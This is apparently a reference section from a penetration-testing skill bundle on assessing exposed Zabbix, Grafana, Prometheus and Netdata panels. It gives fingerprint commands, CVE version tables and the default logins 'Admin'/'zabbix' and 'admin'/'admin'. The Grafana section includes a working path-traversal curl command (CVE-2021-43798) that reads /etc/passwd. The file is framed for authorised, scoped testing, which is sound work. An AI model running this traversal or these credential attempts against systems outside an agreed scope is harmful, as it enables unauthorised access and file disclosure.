# Monitoring and dashboard panels

Zabbix, Grafana, Prometheus, Netdata. All four are built on the assumption that
the network in front of them is trusted. None of them is designed to be the
outermost authentication boundary of an estate.

Scope note: Kibana, Elasticsearch, Splunk's `splunkd`, Hadoop NameNode and YARN
ResourceManager are owned by `hunt-exposed-services`
(`references/databases.md`). Grafana's CSRF issue CVE-2022-21703 is owned by
`hunt-csrf`. Do not re-cover any of them here; cross-reference instead.

Rate posture for everything below: serial, one host at a time, 2 s base delay
plus 0-3 s jitter. See SKILL.md Step 1.

---

## Zabbix frontend

### Fingerprint (Stage A)

The frontend lives either at the web root or under a `/zabbix/` prefix, and the
JSON-RPC API sits in the same directory as `api_jsonrpc.php`
([vendor API docs](https://www.zabbix.com/documentation/current/en/manual/api)).

The cleanest version oracle in this skill: `apiinfo.version` is documented as
**only available to unauthenticated users**
([method reference](https://www.zabbix.com/documentation/current/en/manual/api/reference/apiinfo/version)).
A version string from it is not a misconfiguration — it is the documented
behaviour — but it gives you an exact build before you touch anything else.

```bash
TARGET="target.example"   # in-scope host from the signed scope document

# Stage A — read-only. Unauthenticated by design.
for BASE in "" "/zabbix"; do
  curl -s -m 15 -H 'Content-Type: application/json-rpc' \
    -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":[],"id":1}' \
    "https://${TARGET}${BASE}/api_jsonrpc.php" | head -c 400
  echo; sleep 3
done
```

A frontend that answers here is Zabbix, and the `result` field is the API
version, which tracks the server version.

### Pre-auth and low-privilege CVEs, verified ranges

| CVE | What it is | Affected (NVD) | Pre-auth? |
|---|---|---|---|
| CVE-2022-23131 | With SAML SSO enabled (non-default), session data can be modified because the user login stored in the session was not verified. An unauthenticated actor can escalate to admin on the frontend. Needs a known username, or the `guest` account, which is disabled by default. | 5.4.0 to before 5.4.8; 6.0.0alpha1 | Yes, if SAML SSO is on |
| CVE-2024-42327 | SQL injection in `CUser::addRelatedObjects`, reached through the `CUser.get` API method, which is available to **any** account with API access, including the default User role. | 6.0.0 to before 6.0.32; 6.4.0 to before 6.4.17; 7.0.0 to before 7.0.1 | No — needs any API-capable account |
| CVE-2024-22120 | Time-based blind SQL injection through the unsanitised `clientip` field written to the audit log after the server runs a configured script. | 6.0.0 to before 6.0.28; 6.4.0 to before 6.4.13; 7.0.0 alpha builds | No |

Reporting discipline: CVE-2022-23131 is only reachable when SAML authentication
is configured. Check for a SAML login option on the sign-in page before you
claim it. A version in range with local authentication only is a patch-hygiene
finding, not an authentication bypass.

The two SQL injection issues need an account. If the engagement supplied one,
hand the parameter to `hunt-sqli` and keep the product-specific part — the
method name and the version range — in the report. Do not guess credentials to
reach them.

### Default credentials and lockout

The documented default frontend login is `Admin` / `zabbix`
([quickstart login](https://www.zabbix.com/documentation/current/en/manual/quickstart/login)).
The same page states that after **five consecutive failed login attempts** the
interface pauses for 30 seconds. That is a throttle, not a permanent lockout, so
a single high-confidence attempt is cheap — and a spray is still forbidden by
SKILL.md Step 5.

### Where the chain ends

Zabbix's script-execution feature is a deliberate remote-command facility for
monitored hosts. Confirming an administrative session is the finding. Adding or
running a script is command execution on monitored infrastructure and is
**Stage B at best, and out of scope for this bundle in practice** — the KB note
behind this section continues into reverse shells and pivoting, which this
bundle excludes. Stop at "admin session on the monitoring plane, N hosts
visible".

Zabbix agent (10050) and trapper (10051) are raw TCP, not HTTP. They are
owned by `infra-monitoring-logging` (`references/agent-protocols.md`), which
also carries the KEV-listed frontend rows CVE-2021-39226 (Grafana) and
CVE-2022-23134 (Zabbix) as version checks.

---

## Grafana

### Fingerprint (Stage A)

Default HTTP port is 3000 (`http_port`,
[configure-grafana](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/)),
though most real deployments sit behind a reverse proxy on 443.

```bash
# Stage A — read-only. The vendor's own API example for this endpoint sends
# no Authorization header.
curl -s -m 15 "https://${TARGET}/api/health"
# → {"commit":"...","database":"ok","version":"..."}
```

`GET /api/health` returns `commit`, `database` and `version`
([HTTP API, other endpoints](https://grafana.com/docs/grafana/latest/developers/http_api/other/)).
Treat the version string as the routing key for everything below.

### CVE-2021-43798 — unauthenticated plugin path traversal

Grafana 8.0.0-beta1 through 8.3.0 serves plugin assets from
`/public/plugins/<plugin-id>/` without normalising the path, so a traversal
sequence reads arbitrary local files as the Grafana process user. Fixed in
8.0.7, 8.1.8, 8.2.7 and 8.3.1
([GHSA-8pjx-jj86-j47p](https://github.com/grafana/grafana/security/advisories/GHSA-8pjx-jj86-j47p)).

The advisory names the pre-installed plugin IDs, which is what makes this
reliable without enumeration: `alertlist`, `prometheus`, `mysql`, `postgres`,
`mssql`, `influxdb`, `loki`, `elasticsearch`, `graph`, `table`, `text`,
`piechart`, `welcome`, `testdata` and others ship with every instance.

```bash
# Stage A — read-only file read. Target a file whose content you can predict,
# so a WAF error page cannot be mistaken for a hit.
PLUGIN="prometheus"
curl -s -m 15 --path-as-is \
  "https://${TARGET}/public/plugins/${PLUGIN}/../../../../../../../../etc/passwd" \
  -o /tmp/graf_trav.txt -w '%{http_code}\n'

# Confirmed ONLY if the body contains a line matching ^root:x?:0:0:
grep -qE '^root:[^:]*:0:0:' /tmp/graf_trav.txt && echo "TRAVERSAL CONFIRMED"
```

Use `--path-as-is`; curl collapses `../` segments otherwise and you will report
a false negative. Keep the read to a file with no personal data in it. Reading
`grafana.ini` or `grafana.db` is the impact statement, not the proof step: name
what *would* be readable rather than pulling the credential store.

### CVE-2024-9264 — SQL Expressions command injection

The experimental SQL Expressions feature passes user input into `duckdb` queries
with insufficient sanitisation, giving command injection and local file
inclusion. NVD records it against Grafana 11.0.0. Two preconditions the advisory
is explicit about, both of which you must check before claiming it:

- Any account with **VIEWER or higher** permission can trigger it. It is not
  pre-auth.
- The `duckdb` binary must be present in Grafana's `$PATH`. It is **not**
  installed in Grafana distributions by default.

Because it needs an account and a non-default binary, treat a version match as a
version finding. Executing it is Stage B with the RCE canary protocol from
SKILL.md Step 6, and only with a supplied account.

### CVE-2025-4123 ("Grafana Ghost") and CVE-2025-6023 — open redirect to XSS

| CVE | What it is | Affected | Fixed in |
|---|---|---|---|
| CVE-2025-4123 | Client path traversal plus open redirect loads an attacker-hosted frontend plugin, giving XSS and account takeover. No editor permission needed; works for an anonymous visitor if anonymous access is on. With the **Image Renderer** plugin installed the same redirect becomes a full-read SSRF. | All supported versions as of May 2025, back to at least Grafana 8 | 12.0.0+security-01, 11.6.1+security-01, 11.5.4+security-01, 11.4.4+security-01, 11.3.6+security-01, 11.2.9+security-01, 10.4.18+security-01 ([vendor](https://grafana.com/blog/2025/05/21/grafana-security-release-high-severity-security-fix-for-cve-2025-4123)) |
| CVE-2025-6023 | A second open redirect, chained with path traversal to XSS. The victim needs Viewer, or nothing if anonymous access is enabled. | 11.5.0 and later | 12.0.2+security-01, 11.6.3+security-01, 11.5.6+security-01, 11.4.6+security-01, 11.3.8+security-01 ([vendor](https://grafana.com/blog/grafana-security-release-medium-and-high-severity-fixes-for-cve-2025-6197-and-cve-2025-6023)) |

OX Security, who named CVE-2025-4123 "The Grafana Ghost", reported 36% of
public-facing instances still vulnerable after the patch shipped. Both CVEs
need a victim to follow a crafted link, so the Stage A evidence is the version
from `/api/health` plus the two preconditions below, which raise severity:

```bash
# Stage A — read-only. Anonymous access on? 200 + JSON array = yes, 401 = no.
curl -s -m 15 -o /dev/null -w '%{http_code}\n' "https://${TARGET}/api/search?limit=1"
# Default CSP blocks the CVE-2025-4123 XSS (connect-src). No header = not mitigated.
curl -s -m 15 -D - -o /dev/null "https://${TARGET}/login" | grep -i '^content-security-policy'
```

Building the redirect and plugin payload is Stage B, against a tester-owned
account only. Do not send a crafted link to a real user, and do not point the
renderer SSRF at internal hosts without written sign-off.

### Default credentials and lockout

`admin_user` defaults to `admin` and `admin_password` defaults to `admin`, set
once on first run. Brute-force protection is on by default
(`disable_brute_force_login_protection` default `false`) and
`brute_force_login_protection_max_attempts` defaults to `5`
([configure-grafana](https://grafana.com/docs/grafana/latest/setup-grafana/configure-grafana/)).
One attempt with the documented pair. If it fails, stop.

Also worth a line in the report, with no requests needed: anonymous access is a
supported Grafana configuration. A dashboard that renders production metrics to
an unauthenticated visitor is a finding on its own, independent of any CVE.

---

## Prometheus

Prometheus has **no authentication layer of its own by design**. The project's
security page states that it presumes untrusted users have access to the HTTP
endpoint and logs, that such users have access to all time-series information in
the database, and that its endpoints should not be exposed to publicly
accessible networks. Basic authentication is supported but optional
([Prometheus security](https://prometheus.io/docs/operating/security/)).

The web interface and metrics are served on port 9090 by default, with the
server's own metrics at `/metrics`
([getting started](https://prometheus.io/docs/prometheus/latest/getting_started/)).

```bash
# Stage A — read-only. Each of these is a single GET.
for P in /api/v1/status/buildinfo /api/v1/status/runtimeinfo \
         /api/v1/status/flags /api/v1/status/config /api/v1/targets; do
  echo "== $P"
  curl -s -m 15 "https://${TARGET}:9090${P}" | head -c 600; echo
  sleep 3
done
```

([query API reference](https://prometheus.io/docs/prometheus/latest/querying/api/))

What makes this a finding is not the exposure alone but the content:

- `/api/v1/status/config` returns the running configuration, which routinely
  contains scrape-target hostnames, internal addressing, bearer tokens and
  `basic_auth` blocks for the systems Prometheus monitors. Credentials in the
  config are a Critical, not a Medium.
- `/api/v1/targets` maps the internal estate: every monitored host, port and job
  label. That is an infrastructure blueprint.
- `/api/v1/status/flags` reveals storage paths and enabled feature flags.

The admin API is **disabled by default** and enabled with
`--web.enable-admin-api`. Its endpoints are `POST`/`PUT`
`/api/v1/admin/tsdb/snapshot`, `/api/v1/admin/tsdb/delete_series` and
`/api/v1/admin/tsdb/clean_tombstones`. Two of those three destroy monitoring
data. **Never call them.** To prove the flag is set, read it from
`/api/v1/status/flags`, which is read-only; the flag's presence in that output
is the evidence, and it carries no risk of deleting a series.

Report shape: "unauthenticated Prometheus, config endpoint discloses N scrape
targets and M credential blocks, admin API enabled per `status/flags`". Redact
the credentials in the evidence.

---

## Netdata

The agent's local dashboard listens on port **19999** by default, requires no
authentication, and the default access list `localhost *` permits external
connections — so an agent on a host with a public address exposes its dashboard
and metrics to anyone. Bearer-token protection is opt-in
(`bearer token protection = yes`)
([securing Netdata agents](https://learn.netdata.cloud/docs/netdata-agent/securing-netdata-agents)).

```bash
# Stage A — read-only fingerprint.
curl -s -m 15 "http://${TARGET}:19999/" | grep -o -i "netdata" | head -1
```

The impact is per-second system telemetry: process names and command lines,
listening sockets, mounted filesystems, container names, database and web-server
charts. On a shared host that is an internal-architecture leak and, where
command lines carry arguments, sometimes a credential leak. Capture a redacted
screenshot or a single chart listing to evidence the data class. Do not pull the
metric history.

Grade on the content you actually saw. A Netdata agent exposing only CPU and
disk charts is a hardening item; one listing process command lines and internal
service topology is a disclosure finding.

---

## Cross-references

- `hunt-exposed-services` — Kibana 5601, Elasticsearch 9200, `splunkd` 8089,
  Hadoop 9870/8088, InfluxDB 8086.
- `hunt-csrf` — Grafana CVE-2022-21703.
- `hunt-open-redirect`, `hunt-xss` — redirect and XSS mechanics behind Grafana
  CVE-2025-4123 and CVE-2025-6023.
- `hunt-sqli` — the injection mechanics behind the two Zabbix SQLi CVEs, once
  you have an account.
- `hunt-lfi` — traversal mechanics and post-read file targets behind
  CVE-2021-43798.
- `hunt-tls-network` — certificate and TLS findings on any of these ports.
